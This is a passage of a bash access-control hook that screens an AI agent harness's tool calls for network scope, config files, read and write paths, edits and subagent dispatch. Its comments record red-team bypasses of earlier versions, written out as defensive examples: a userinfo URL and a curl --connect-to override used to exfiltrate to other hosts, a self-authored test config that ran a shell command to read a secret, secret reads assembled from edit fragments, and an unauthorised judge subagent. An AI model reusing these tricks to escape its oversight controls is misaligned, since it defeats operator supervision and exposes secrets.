    # 3g. NETWORK DESTINATION. The kernel models what a command reads,
    # writes and executes, and modelled nothing at all about who it talks
    # to — while the authored-code screen has flagged `fetch`,
    # `request.get` and the `net`/`http` modules as an exfiltration
    # capability since round 1. One more rule living on one channel and
    # not on its neighbour, this time on the channel carrying the
    # property this project advertises most: a bounded blast radius for
    # prompt injection.
    #
    # Round 33 pointed the benchmark's own grant — which reads as "this
    # role may talk to the app under test and nothing else" —
    #
    #     ^curl -[a-zA-Z]* http://localhost:4173\b
    #
    # at `http://localhost:4173@example.com/`, and curl connected to
    # example.com. `localhost:4173` is USERINFO. The reviewer ran it and
    # shipped an in-scope file to a listener off-box.
    #
    # A URL authority is a parser problem and a command group is a prefix
    # match, so no pattern an operator can write is a destination
    # boundary. Two rules, neither of which hunts for dangerous hosts:
    #
    #   userinfo in a URL is refused outright — an agent has no reason to
    #   embed credentials in one, and it is the single spelling that
    #   makes a URL's visible prefix differ from where it connects;
    #
    #   a role that declares `network.allow` has every URL authority
    #   checked against it by PARSING rather than by matching text, which
    #   also closes `localhost:4173.evil.com` — a different bug with the
    #   same cause, since `\b` ends a pattern where a hostname does not.
    #
    # Declaring the scope is opt-in, exactly like `codeImports`, because
    # a default of "no network" would refuse every existing manifest's
    # health check. `validate` says so for any role that can reach the
    # network without one.
    NET_ALLOW=$(harness_os_role_field "$ROLE" '.network.allow')
    # A URL is only a DESTINATION when something can dial it. Commands
    # that manipulate text open no socket, and agents print URLs
    # constantly — `echo see http://…`, `grep -n http://… file`. Denying
    # those is the alarm fatigue this project designs against, and it
    # was a latent false positive from round 33 that only surfaced when
    # round 35's tests exercised an out-of-scope URL in prose.
    #
    # The list EXEMPTS rather than enumerates, which is the direction
    # this kernel has settled on everywhere else: a command nobody has
    # modelled is checked, because the unknown tool that connects is
    # more dangerous than the unknown tool that prints.
    case "${SEG_WORDS[0]:-}" in
      echo|printf|cat|head|tail|grep|egrep|fgrep|rg|ag|ack|sed|awk|gawk|mawk|jq|ls|find|wc|sort|uniq|comm|diff|tr|cut|paste|tee|basename|dirname|realpath|test|true|false|expr|date|env|export|read|history)
        NET_SKIP=1 ;;
      *) NET_SKIP=0 ;;
    esac
    while [ "$NET_SKIP" = "0" ] && IFS= read -r NETW; do
      [ -n "$NETW" ] || continue
      # A URL can arrive as a flag's VALUE (`--url=http://…`), and the
      # scan used to look only at tokens that START with a scheme. Round
      # 35 flagged it as not-yet-weaponisable through curl and the same
      # parser assumption all the same; strip a leading `opt=` so the
      # next tool that takes one is not a new finding.
      # ...but only for a FLAG. A query string lives INSIDE a URL —
      # `http://localhost:4173/?next=http://evil.com/` names one
      # destination and mentions another as data — and stripping at the
      # first `=` turned round 33's own calibration case into a deny.
      # The flag form always starts with a dash; the query form never
      # does.
      case "$NETW" in -*=*://*) NETW="${NETW#*=}" ;; esac
      harness_os_is_network_url "$NETW" || continue
      NET_AUTH=$(harness_os_url_authority "$NETW")
      [ -n "$NET_AUTH" ] || continue
      NET_USER=$(harness_os_url_userinfo "$NETW")
      if [ -n "$NET_USER" ]; then
        set +f
        harness_os_deny "bash-url-userinfo $NET_AUTH" "[BLOCKED] Role '${ROLE}' used a URL carrying credentials before the host, which connects somewhere other than it appears to.

${ROLE_HEADER}

Command: ${CMD}

  written:     ${NETW}
  connects to: ${NET_AUTH}
  (everything before the @ is userinfo, not a host)

A command group is a regex over argv, so a pattern pinning a URL prefix cannot be a destination boundary: the text before the @ can be made to read exactly like the host you were granted. Write the URL without userinfo. If this role genuinely needs HTTP authentication, pass it as a header or a credentials flag, where it is not pretending to be a hostname."
      fi
      if [ "$NET_ALLOW" != "null" ] && ! harness_os_authority_in_scope "$NET_AUTH" "$NET_ALLOW"; then
        set +f
        harness_os_deny "bash-network-out-of-scope $NET_AUTH" "[BLOCKED] Role '${ROLE}' may not connect to '$NET_AUTH' — it is outside the role's network scope.

${ROLE_HEADER}
network scope: $(printf '%s' "$NET_ALLOW" | "$JQ" -r 'join(\", \")' 2>/dev/null)

Command: ${CMD}

The authority is parsed rather than pattern-matched, so a host that merely STARTS with a permitted one, or hides it in userinfo, is a different destination and is refused. Entries name a host, optionally with a port: a bare host permits any port, and a leading *. permits subdomains."
      fi
    done < <(printf '%s\n' "$seg" | tr ' \t"'"'"'`(),;' '\n\n\n\n\n\n\n\n\n')

    # 3g-2. DESTINATION OVERRIDES THAT ARE NOT URLS.
    #
    # Round 33 built the axis above as a URL-token scanner, and round 34
    # walked through it in one command:
    #
    #     curl -s http://localhost:4173 --connect-to localhost:4173:127.0.0.1:9999
    #
    # The URL token parses to `localhost:4173` and is in scope. The
    # override carries the real destination as a bare `host:port` with no
    # `://`, so the scanner never looked at it, and curl dialled
    # 127.0.0.1:9999 — SSRF, plus the in-scope-context exfiltration round
    # 33 had just claimed to close, in a command the kernel ALLOWED.
    #
    # Round 33's own stated invariant is the one to hold: does the string
    # the kernel parses equal the host the client dials? For a client
    # whose destination can be overridden by a flag, "the URL" is not
    # that string. So the overrides are parsed as destinations and
    # scope-checked like any other, and the one that moves the
    # destination into a FILE is refused outright, because a destination
    # the kernel cannot read is a destination it cannot check.
    #
    # Be honest about what this is. It is an enumeration of curl's
    # override flags, and round 34's argument against enumerating them is
    # correct: the next flag always arrives. The sound boundary is egress
    # enforced outside the process — a filtering proxy or a network
    # namespace pinned to `network.allow` — and `network.allow` is
    # advisory until one is in place, which is what `validate` and the
    # architecture doc now say in those words.
    if [ "$NET_ALLOW" != "null" ] && [ "$NET_SKIP" = "0" ]; then
      NF_NEXT=""
      for __i in "${!SEG_WORDS[@]}"; do
        [ "$__i" = "0" ] && continue
        __w="${SEG_WORDS[$__i]}"
        NF_VAL=""
        if [ -n "$NF_NEXT" ]; then NF_VAL="$__w"; NF_KIND="$NF_NEXT"; NF_NEXT=""
        else
          case "$__w" in
            --connect-to|--resolve) NF_NEXT="map"; continue ;;
            -x|--proxy|--preproxy|--socks4|--socks4a|--socks5|--socks5-hostname|--proxy1.0)
              NF_NEXT="proxy"; continue ;;
            --connect-to=*|--resolve=*) NF_VAL="${__w#*=}"; NF_KIND="map" ;;
            --proxy=*|--preproxy=*|--socks5=*|--socks5-hostname=*) NF_VAL="${__w#*=}"; NF_KIND="proxy" ;;
            -x?*) NF_VAL="${__w#-x}"; NF_KIND="proxy" ;;
            -K|--config)
              set +f
              harness_os_deny "bash-network-config-file" "[BLOCKED] Role '${ROLE}' declares a network scope, and this command reads its options from a file, where a destination cannot be checked.

${ROLE_HEADER}
network scope: $(printf '%s' "$NET_ALLOW" | "$JQ" -r 'join(\", \")' 2>/dev/null)

Command: ${CMD}

A curl config file may carry its own \`url =\` line, so the destination moves out of the command entirely. The kernel refuses that rather than checking a URL that is no longer the one being used. Put the request on the command line, where its destination is visible."
              ;;
            -K?*|--config=*)
              set +f
              harness_os_deny "bash-network-config-file" "[BLOCKED] Role '${ROLE}' declares a network scope, and this command reads its options from a file, where a destination cannot be checked.

${ROLE_HEADER}

Command: ${CMD}

Put the request on the command line, where its destination is visible."
              ;;
            *) continue ;;
          esac
        fi
        [ -n "$NF_VAL" ] || continue
        # `--connect-to HOST:PORT:CONNECT-HOST:CONNECT-PORT` and
        # `--resolve HOST:PORT:ADDRESS` both put the REAL destination
        # last. Take the tail after the second colon-separated field, so
        # the leading pair — which is only the request's apparent host —
        # cannot stand in for it.
        case "$NF_KIND" in
          map)
            NF_REST="${NF_VAL#*:}"; NF_REST="${NF_REST#*:}"
            [ -n "$NF_REST" ] && [ "$NF_REST" != "$NF_VAL" ] || continue
            NF_AUTH=$(printf '%s' "$NF_REST" | tr 'A-Z' 'a-z') ;;
          proxy)
            NF_AUTH=$(harness_os_url_authority "$NF_VAL")
            [ -n "$NF_AUTH" ] || NF_AUTH=$(printf '%s' "${NF_VAL%%/*}" | tr 'A-Z' 'a-z') ;;
          *) continue ;;
        esac
        [ -n "$NF_AUTH" ] || continue
        if ! harness_os_authority_in_scope "$NF_AUTH" "$NET_ALLOW"; then
          set +f
          harness_os_deny "bash-network-override-out-of-scope $NF_AUTH" "[BLOCKED] Role '${ROLE}' may not connect to '$NF_AUTH' — the command overrides its destination to somewhere outside the role's network scope.

${ROLE_HEADER}
network scope: $(printf '%s' "$NET_ALLOW" | "$JQ" -r 'join(\", \")' 2>/dev/null)

Command: ${CMD}

  the URL names:  a host inside your scope
  the client dials: ${NF_AUTH}

Flags like --connect-to, --resolve and --proxy replace the destination without changing the URL, so the address in the request is not the address on the wire. The override is held to the same scope as the URL itself."
        fi
      done
    fi

    # 5c. A contained role may not point a run at a file it can write.
    #
    # Round 25 walked through axis 5b without writing a line of code. The
    # composer authored `tests/e2e/evil.config.ts` — inside its write
    # scope — holding a framework config whose `webServer.command` is a
    # shell command, then ran `npx playwright test -c
    # tests/e2e/evil.config.ts`, a command its group grants outright.
    # Playwright spawned the string through /bin/sh, the secret landed in
    # `tests/e2e/`, which is in the composer's READ scope, and the
    # composer read it. Every step ALLOW, no obfuscation anywhere.
    #
    # The capability screen now recognises a `command:` key, which closes
    # that spelling where the file is authored. This closes the SHAPE,
    # and it needs to: the config need not look like a config. A
    # `.spec.ts` that default-exports a config object is a valid `-c`
    # operand, so screening by filename misses it, and screening by
    # content is the arms race round 25 was about.
    #
    # The rule is stated against the role's own grants rather than any
    # framework's semantics. A role that declares what its code may
    # import or do is a role whose authored files are held at arm's
    # length, and a config file is instructions to the runtime rather
    # than data for it. So the runtime may not be handed one from inside
    # that role's write scope. Named test files are untouched: they
    # arrive as POSITIONAL operands, which is the job.
    # Contained means the same thing here as in the code screen: a role
    # that authors executable files AND can run them is held to the
    # write-then-execute rules whether or not it declared a list. Reading
    # the declaration directly is what let an author+run role opt out of
    # this axis by saying nothing.
    if [ "$WRITE_ALLOW" != "null" ] && [ "$BASH_SPEC" != "null" ]; then
      case "${SEG_WORDS[0]:-}" in
        npx|npm|yarn|pnpm|bunx|node|nodejs|deno|bun|tsx|ts-node|playwright|vitest|jest|mocha|cypress|wdio)
          CFG_NEXT=0
          for __i in "${!SEG_WORDS[@]}"; do
            [ "$__i" = "0" ] && continue
            __w="${SEG_WORDS[$__i]}"
            CFG_CAND=""
            if [ "$CFG_NEXT" = "1" ]; then
              CFG_NEXT=0
              case "$__w" in -*) continue ;; esac
              CFG_CAND="$__w"
            else
              case "$__w" in
                -c|--config|--config-file|--global-setup|--globalSetup|--global-teardown|--globalTeardown|--setup-files|--setupFiles|--require|--import|--loader|--experimental-loader|--reporter|--preset)
                  CFG_NEXT=1; continue ;;
                --config=*|--config-file=*|--global-setup=*|--globalSetup=*|--global-teardown=*|--globalTeardown=*|--setup-files=*|--setupFiles=*|--require=*|--import=*|--loader=*|--experimental-loader=*|--reporter=*|--preset=*)
                  CFG_CAND="${__w#*=}" ;;
                -c?*) CFG_CAND="${__w#-c}" ;;
                *) continue ;;
              esac
            fi
            [ -n "$CFG_CAND" ] || continue
            case "$CFG_CAND" in *://*|-*) continue ;; esac
            CFG_REL=$(harness_os_relpath "$(harness_os_normalize_path "$CFG_CAND")")
            harness_os_path_in_scope "$CFG_REL" "$WRITE_ALLOW" || continue
            harness_os_deny "bash-self-authored-config $CFG_REL" "[BLOCKED] Role '${ROLE}' may not hand '$CFG_REL' to '${SEG_WORDS[0]}' as configuration — it is inside this role's own write scope.

${ROLE_HEADER}
write scope: $(printf '%s' "$WRITE_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

Command: ${CMD}

A configuration file is instructions to the runtime, not data for it: a framework config can name a web-server command, a global setup module or a reporter, and every one of those becomes a process. This role declares what its code may import or do, so its authored files are held at arm's length — which means it may not author the file that tells the runner what to do and then hand it over.

Naming test files is unaffected; they are positional operands, not configuration:
  ${SEG_WORDS[0]} … tests/…/your.spec.ts

If this role genuinely needs its own runner configuration, the operator owns that file: put it outside this role's write scope, where the run picks it up and the role cannot rewrite it."
          done
          ;;
      esac
    fi
  done <<< "$SEGMENTS"
fi
# --- Axis 4: read scope --------------------------------------------------
check_path_scope() {
  # check_path_scope <axis:read|write> <rel-path> <verb-for-message>
  local axis="$1" rel="$2" verb="$3" allow deny
  allow=$(harness_os_role_field "$ROLE" ".${axis}.allow")
  deny=$(harness_os_role_field "$ROLE" ".${axis}.deny")

  if [ "$deny" != "null" ] && harness_os_path_in_scope "$rel" "$deny"; then
    harness_os_deny "${axis}-deny $rel" "[BLOCKED] Role '${ROLE}' is explicitly denied ${verb} '$rel'.

${ROLE_HEADER}"
  fi
  if [ "$axis" = "read" ]; then
    [ "$allow" = "null" ] && return 0   # read is opt-out
  else
    if [ "$allow" = "null" ]; then
      harness_os_deny "write-none $rel" "[BLOCKED] Role '${ROLE}' has no write grants at all — writing '$rel' is outside its mandate.

${ROLE_HEADER}

Produce your result as your return value (or a report), and let the role that owns this path persist it."
    fi
  fi
  if ! harness_os_path_in_scope "$rel" "$allow"; then
    local scope_list
    scope_list=$(printf '%s' "$allow" | "$JQ" -r 'join(", ")' 2>/dev/null || echo "")
    harness_os_deny "${axis}-out-of-scope $rel" "[BLOCKED] Role '${ROLE}' may not ${verb} '$rel' — it is outside the role's ${axis} scope.

${ROLE_HEADER}
${axis} scope: ${scope_list}

The scope is deliberate context hygiene: files outside it are another role's concern and would only dilute this context window. If the task truly requires this path, the manifest grant is what needs to change — ask the operator."
  fi
}

case "$HOS_TOOL" in
  Read|NotebookRead)
    TARGET=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.file_path // .tool_input.notebook_path // empty' 2>/dev/null || echo "")
    # The manifest itself is implicitly readable by every governed role —
    # it is the law the role is being held to (writes stay locked by the
    # self-protection axis).
    if [ -n "$TARGET" ] && ! harness_os_is_manifest_path "$TARGET"; then
      check_path_scope read "$(harness_os_relpath "$TARGET")" "read"
    fi
    ;;
  WebFetch|WebSearch)
    # A fetch tool is a read channel whenever its URL names the local
    # filesystem. The kernel already knew that in two other places — the
    # code screen refuses `page.goto("file:///…")`, and the MCP axis
    # unwraps `file://` before scoping, with a comment recording that
    # skipping anything merely containing "://" let `file://secret` past
    # the very check the manifest configured. Neither copy covered the
    # tool whose entire job is fetching a URL.
    #
    # Found by auditing for round 22's lesson rather than by a reviewer:
    # a rule attached to a channel exists once per channel, so the
    # question worth asking of any check is not whether it is correct
    # but how many channels implement it.
    WF_URL=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.url // .tool_input.query // empty' 2>/dev/null || echo "")
    if [ -n "$WF_URL" ]; then
      # `data:` is inline content, not a destination — no authority to
      # check and nothing on the wire.
      case "$WF_URL" in data:*|DATA:*|Data:*) WF_URL="" ;; esac
      if [ -n "$WF_URL" ] && harness_os_is_network_url "$WF_URL"; then WF_KIND=remote
      else WF_KIND=local; fi
      case "${WF_KIND}:${WF_URL}" in
        remote:*)
          # Genuinely remote — and held to the same network scope as a
          # curl in Bash. Round 33 built that scope on the Bash channel;
          # round 34 pointed out it stopped there, so a manifest could
          # bound where curl connects and leave the tool whose ENTIRE JOB
          # is fetching a URL unbounded. The comment eight lines above
          # says the question worth asking of any check is how many
          # channels implement it, and this check had one.
          WF_NET=$(harness_os_role_field "$ROLE" '.network.allow')
          WF_AUTH=$(harness_os_url_authority "$WF_URL")
          WF_USER=$(harness_os_url_userinfo "$WF_URL")
          if [ -n "$WF_USER" ]; then
            harness_os_deny "webfetch-url-userinfo $WF_AUTH" "[BLOCKED] Role '${ROLE}' used a URL carrying credentials before the host, which fetches somewhere other than it appears to.

${ROLE_HEADER}

  written:     ${WF_URL}
  connects to: ${WF_AUTH}

Write the URL without userinfo — everything before the @ is credentials, not a hostname."
          fi
          if [ "$WF_NET" != "null" ] && [ -n "$WF_AUTH" ] \
             && ! harness_os_authority_in_scope "$WF_AUTH" "$WF_NET"; then
            harness_os_deny "webfetch-network-out-of-scope $WF_AUTH" "[BLOCKED] Role '${ROLE}' may not fetch '$WF_AUTH' — it is outside the role's network scope.

${ROLE_HEADER}
network scope: $(printf '%s' "$WF_NET" | "$JQ" -r 'join(", ")' 2>/dev/null)

A fetch tool reaches the network exactly as a curl does, so it is held to the same scope. The authority is parsed rather than matched as text."
          fi
          ;;
        local:file://*|local:FILE://*|local:File://*)
          WF_P="${WF_URL#*://}"; [ "${WF_P#/}" = "$WF_P" ] && WF_P="/$WF_P"
          harness_os_is_manifest_path "$WF_P" || check_path_scope read "$(harness_os_relpath "$WF_P")" "read via ${HOS_TOOL}" ;;
        local:/*|local:./*|local:../*|local:~/*)
          harness_os_is_manifest_path "$WF_URL" || check_path_scope read "$(harness_os_relpath "$WF_URL")" "read via ${HOS_TOOL}" ;;
      esac
    fi
    ;;
  Glob|Grep)
    TARGET=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.path // empty' 2>/dev/null || echo "")
    # A pattern/glob is applied UNDER the search root, so a `..` segment
    # in it escapes the scoped path exactly as it would in a filename.
    # Deny upward traversal in the pattern — a scoped role narrows with
    # `path`, never by globbing out of its search root.
    # BOTH fields must be checked: a Grep can carry `pattern` (the regex)
    # AND `glob` (the file filter), and reading only the first non-empty
    # one left the other unchecked. An absolute or ~ pattern escapes the
    # search root just as `..` does.
    # Only PATH-shaped fields are traversal-checked. Grep's `pattern` is
    # a REGEX — a legitimate search for "/etc/" or "\.\./" is not an
    # attempt to escape the root, and blocking it was a false positive.
    search_pattern_offender
    case "x$SEARCH_PAT" in
      x) : ;;
      *)
        harness_os_deny "search-pattern-traversal" "[BLOCKED] Role '${ROLE}' used a '..' upward-traversal segment in a $HOS_TOOL pattern.

${ROLE_HEADER}

A pattern is applied under the search root, so '..' escapes the role's scope. Narrow the search with the 'path' argument (kept inside your read scope) instead of globbing upward." ;;
    esac
    # No path → the search runs from the repo root; scoped roles are
    # expected to search INSIDE their scope, so root needs a root-wide
    # grant.
    [ -n "$TARGET" ] || TARGET="$HOS_ROOT"
    check_path_scope read "$(harness_os_relpath "$TARGET")" "search"
    ;;
  Write|Edit|NotebookEdit)
    TARGET=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.file_path // .tool_input.notebook_path // empty' 2>/dev/null || echo "")
    [ -n "$TARGET" ] && check_path_scope write "$(harness_os_relpath "$TARGET")" "write"

    # Axis 5b — the shared screen defined above. The bash write channel
    # runs the identical check, so neither authoring route is the soft one.
    #
    # For an Edit the tool input is a DIFF, and screening the diff is not
    # screening the file. Two edits whose fragments are each harmless
    # compose into one that is not:
    #
    #     'const x = 1;'  ->  'const d = reqA;'      (allowed: no match)
    #     'A;'            ->  'uire("dotenv"); …'    (allowed: no match)
    #     on disk:            const d = require("dotenv"); …
    #
    # Verified end to end before fixing — the assembled file read the
    # secret. So the screen is given the file's RESULTING content:
    # existing bytes with the replacement applied. The replacement is
    # literal (index-based), never a regex, so no metacharacter in
    # old_string can change what is matched.
    if [ -n "$TARGET" ]; then
      CODE=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.content // .tool_input.new_string // .tool_input.new_source // empty' 2>/dev/null || echo "")
      RESULT_CODE="$CODE"
      if [ "$HOS_TOOL" = "Edit" ]; then
        # Resolve a relative file_path rather than treating it as absent —
        # falling back on the fragment is precisely the blindness this
        # reconstruction exists to remove.
        EDIT_TARGET="$TARGET"
        case "$EDIT_TARGET" in /*) : ;; *) EDIT_TARGET="${HOS_CWD%/}/$EDIT_TARGET" ;; esac
        if [ -f "$EDIT_TARGET" ]; then
          EDIT_SIZE=$(wc -c <"$EDIT_TARGET" 2>/dev/null || echo 0)
          if [ "$EDIT_SIZE" -gt 4194304 ] && { [ "$(harness_os_role_field "$ROLE" '.write.codeImports')" != "null" ] \
               || [ "$(harness_os_role_field "$ROLE" '.write.codeCapabilities')" != "null" ]; }; then
            # FAIL CLOSED. The previous cap fell back to screening the
            # fragment alone, which reinstated the very bypass the
            # reconstruction was added to close: pad a file past the cap,
            # then assemble the escape from fragments that are each
            # innocent. Screening the diff after promising to screen the
            # file is the one behaviour proven unsound, so a file too
            # large to verify is refused rather than half-checked.
            case "$(harness_os_relpath "$EDIT_TARGET")" in
              *.js|*.mjs|*.cjs|*.ts|*.mts|*.cts|*.tsx|*.jsx|*.py|*.rb|*.sh|*.bash|*.zsh|*.pl|*.php|*.ipynb|*.lua|*.ps1)
                harness_os_deny "edit-too-large-to-verify $(harness_os_relpath "$EDIT_TARGET")" "[BLOCKED] Role '${ROLE}' may not Edit '$(harness_os_relpath "$EDIT_TARGET")' — at ${EDIT_SIZE} bytes it is too large for the kernel to verify what the edit makes it become.

${ROLE_HEADER}

An Edit is a diff, and this role declares what its code may import or do — a promise that can only be kept by screening the file's RESULTING content. Above 4 MB that reconstruction is refused rather than skipped, because screening the fragment alone is exactly the blindness the reconstruction exists to remove: an escape can be assembled from fragments that are each innocent.

Options:
  1. Split the file — an executable file this size is unusual, and a spec that big is hard to review for the same reason.
  2. Author a fresh, smaller file with Write, whose whole content is screened." ;;
            esac
          fi
          OLD_S=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.old_string // empty' 2>/dev/null || echo "")
          REPL_ALL=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.replace_all // false' 2>/dev/null || echo false)
          if [ -n "$OLD_S" ]; then
            # `replace_all` rescans from the point after what it just
            # wrote, never from the start. Restarting at zero re-finds the
            # needle inside its own replacement whenever the new text
            # contains the old — rename `foo` to `foobar` and the loop
            # grows the buffer forever. That is an ordinary rename, so the
            # hang was reachable by an agent doing nothing wrong, and a
            # kernel that hangs has stopped being a kernel.
            # `timeout` is belt-and-braces over the fix above, so its
            # absence is not worth a denial.
            HOS_TMO=""; command -v timeout >/dev/null 2>&1 && HOS_TMO="timeout 20"
            RESULT_CODE=$(OLD_S="$OLD_S" NEW_S="$CODE" ALL="$REPL_ALL" $HOS_TMO perl -0777 -e '
              local $/; my $f = <STDIN>;
              my ($o, $n, $all) = ($ENV{OLD_S}, $ENV{NEW_S}, $ENV{ALL} eq "true");
              exit 3 unless length $o;
              if ($all) {
                my $pos = 0;
                while ((my $i = index($f, $o, $pos)) >= 0) {
                  substr($f, $i, length($o)) = $n;
                  $pos = $i + length($n);
                }
              }
              else { my $i = index($f, $o); substr($f, $i, length($o)) = $n if $i >= 0; }
              print $f;' < "$EDIT_TARGET" 2>/dev/null)
            if [ $? -ne 0 ]; then
              # And when the reconstruction cannot be completed, refuse —
              # do not fall back to screening the fragment. That fallback
              # is round 9's F1 exactly: screening the diff after
              # promising to screen the file lets an escape be assembled
              # from pieces that are each innocent.
              harness_os_deny "edit-unreconstructible $(harness_os_relpath "$EDIT_TARGET")" "[BLOCKED] Role '${ROLE}' may not Edit '$(harness_os_relpath "$EDIT_TARGET")' — the kernel could not work out what the file would become.

${ROLE_HEADER}

This role declares what its code may import or do, and that promise is kept by screening the file's RESULTING content, not the diff. When the result cannot be computed the edit is refused rather than half-checked, because screening the fragment alone is the blindness that screening the result exists to remove.

Options:
  1. Re-read the file and Edit against its current contents.
  2. Author the file afresh with Write, whose whole content is screened."
            fi
          fi
        fi
      fi
      # Screen the fragment first. When BOTH the fragment and the result
      # trip, the edit introduced it and the message should say so; when
      # only the result trips, the offending line was already in the file,
      # and telling the agent to change what it just wrote is useless
      # advice. The distinction costs one extra call and turns "this file
      # is uneditable" into "this line has to go first".
      check_code_capabilities "$TARGET" "$CODE"
      check_code_capabilities "$TARGET" "$RESULT_CODE" "
Note: your edit did not introduce this — the file already contains it. Removing that line is the change to make first."
    fi
    ;;
esac

# --- Axis 6: dispatch gate + registry ------------------------------------
# `Agent` and `Task` are the same operation under two names — which one
# a host uses is the host's business, and a dispatch gate that knows only
# one of them is a dispatch gate that a rename switches off. Same lesson
# as the fetch arm above: the rule belongs to the operation, not to the
# name it arrives under.
if [ "$HOS_TOOL" = "Agent" ] || [ "$HOS_TOOL" = "Task" ]; then
  DESCRIPTION=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.description // ""' 2>/dev/null || echo "")
  PROMPT=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.prompt // ""' 2>/dev/null || echo "")
  DISPATCH_LIST=$(harness_os_role_field "$ROLE" '.dispatch')

  # Which manifest role does the description name? Longest role name
  # wins so 'reviewer' can never shadow 'reviewer-adversarial'.
  TARGET_ROLE=""
  while IFS= read -r cand; do
    [ -n "$cand" ] || continue
    if printf '%s' "$DESCRIPTION" | grep -Eq "^[[:space:]]*${cand}(-[a-z0-9-]+)?:"; then
      TARGET_ROLE="$cand"; break
    fi
  done < <(printf '%s' "$HOS_MANIFEST_JSON" | "$JQ" -r '.roles | keys[]' 2>/dev/null | awk '{ print length, $0 }' | sort -rn | cut -d' ' -f2-)

  # NO DISPATCH LIST MEANS NO DISPATCH. The whole gate below used to sit
  # inside `if [ "$DISPATCH_LIST" != "null" ]`, so a role that declared
  # none skipped every check — target-in-list, tag-required, tag-purity —
  # while the registration at the bottom still ran and the child still
  # bound. A role holding Agent and nothing else could mint a child of
  # ANY role, including the judge, with an arbitrary description and no
  # tag at all. Round 29 demonstrated it minting a judge that then wrote
  # the ledger.
  #
  # That is this kernel's own law broken in the identity stack: a gate
  # whose failure mode is ALLOW is not a gate. Absence of a dispatch list
  # is not "dispatch anyone unchecked", it is "this role was never given
  # the authority to dispatch". Read scope is opt-out because reading is
  # the default posture of an agent; handing another agent a ROLE is not.
  if [ "$DISPATCH_LIST" = "null" ]; then
    harness_os_deny "dispatch-undeclared" "[BLOCKED] Role '${ROLE}' may not dispatch subagents — its manifest entry declares no 'dispatch' list.

${ROLE_HEADER}

Dispatching is how a role hands work, and a ROLE, to another agent. A role that names no dispatchable roles has not been given that authority, so the absence is a refusal rather than a blank cheque: without it there is nothing to check the target against, and an unchecked dispatch can mint a child of any role in this manifest.

The operator grants it explicitly, naming who this role may dispatch:
  \"${ROLE}\": { \"dispatch\": [\"<role>\", \"<role>\"] }

Then the target must be one of those, the description must name it, and the prompt must carry its binding tag."
  fi
  if [ "$DISPATCH_LIST" != "null" ]; then
    ROLE_NAMES=$(printf '%s' "$DISPATCH_LIST" | "$JQ" -r 'join(", ")' 2>/dev/null || echo "")
    if [ -z "$TARGET_ROLE" ]; then
      harness_os_deny "dispatch-unprefixed" "[BLOCKED] Role '${ROLE}' may only dispatch role-tagged subagents, but this description names no manifest role.

${ROLE_HEADER}
Dispatchable roles: ${ROLE_NAMES}

Format the dispatch as:
  description: \"<role>-<slug>: <what this task is>\"
  prompt:      must embed the binding tag <<harness-os-role: <role>>>

Untagged children cannot be bound to a role, so the kernel would have to fall back to the unboundAgentPolicy for every call they make."
    fi
    if ! printf '%s' "$DISPATCH_LIST" | "$JQ" -e --arg t "$TARGET_ROLE" 'index($t) != null' >/dev/null 2>&1; then
      harness_os_deny "dispatch-forbidden $TARGET_ROLE" "[BLOCKED] Role '${ROLE}' may not dispatch role '${TARGET_ROLE}'.

${ROLE_HEADER}
Dispatchable roles: ${ROLE_NAMES}

Dispatch rights are part of the separation of duties — if the workflow needs a '${TARGET_ROLE}', that dispatch belongs to a role holding the grant."
    fi
    # The target's tag may carry an optional #NONCE — accept either form.
    if ! printf '%s' "$PROMPT" | grep -Eq "<<harness-os-role: ${TARGET_ROLE}(#[a-z0-9]{4,})?>>"; then
      harness_os_deny "dispatch-untagged $TARGET_ROLE" "[BLOCKED] This dispatch of role '${TARGET_ROLE}' is missing the binding tag in its prompt.

${ROLE_HEADER}

Add the literal line
  <<harness-os-role: ${TARGET_ROLE}>>
to the subagent prompt (ideally the first line, followed by the role's mandate and ONLY the context its scope covers). The tag is how the kernel binds the child's tool calls to '${TARGET_ROLE}' — without it the child may fall back to the unboundAgentPolicy.

For parallel dispatch, add a unique nonce so binding stays exact even
when several roles run at once: <<harness-os-role: ${TARGET_ROLE}#a1b2c3>>."
    fi
    # Tag purity: exactly one role may be tagged in the prompt (nonce
    # ignored). A second, foreign role tag would make the child's
    # transcript ambiguous by construction, forcing every child of this
    # dispatch to the unbound fallback — or worse, seeding a mis-binding.
    # A NEAR MISS IS REFUSED, not waved through. `<<harness-os-role:  judge>>`
    # — two spaces — does not match the strict tag form, so the purity scan
    # below never saw it and the dispatch was allowed. It binds nothing
    # today only because the resolver is exactly as strict as this gate,
    # and those two live in different files and run in different processes:
    # the gate's ALLOW is sound only relative to today's resolver. Round 30
    # could not turn it into an escape and argued it was debt anyway. It is.
    NEAR_TAG=$(printf '%s' "$PROMPT" | harness_os_neartag)
    if [ -n "$NEAR_TAG" ]; then
      harness_os_deny "dispatch-malformed-tag" "[BLOCKED] This dispatch's prompt contains something shaped like a binding tag that this kernel cannot parse:

  ${NEAR_TAG}

${ROLE_HEADER}

A binding tag is exactly \`<<harness-os-role: name>>\` or \`<<harness-os-role: name#nonce>>\` — one space after the colon, a lowercase role name, a nonce of four or more characters of [a-z0-9]. Anything else is refused rather than ignored: a tag the gate cannot read is a tag the gate cannot check, and whether it binds anything depends on a resolver this check has no way to consult.

Write the tag exactly:
  <<harness-os-role: ${TARGET_ROLE}>>"
    fi
    FOREIGN_TAGS=$(printf '%s' "$PROMPT" | harness_os_tag_roles | grep -vxF "${TARGET_ROLE}" || true)
    if [ -n "$FOREIGN_TAGS" ]; then
      harness_os_deny "dispatch-foreign-tag $TARGET_ROLE" "[BLOCKED] This dispatch of role '${TARGET_ROLE}' embeds binding tag(s) for a DIFFERENT role in its prompt:

$(printf '%s' "$FOREIGN_TAGS" | sed 's/^/  /')

${ROLE_HEADER}

A dispatch prompt must carry exactly one role tag — the target's. Foreign tags poison the child's role binding. Remove them (quote a role NAME in prose if you must reference another role, never its <<harness-os-role: …>> tag form)."
    fi
  fi

  # Extract the target's optional nonce so the child can bind exactly by
  # it (resolve rung 4a), then record the dispatch. Runs for
  # ungoverned-dispatch-list roles too, so the child can still bind.
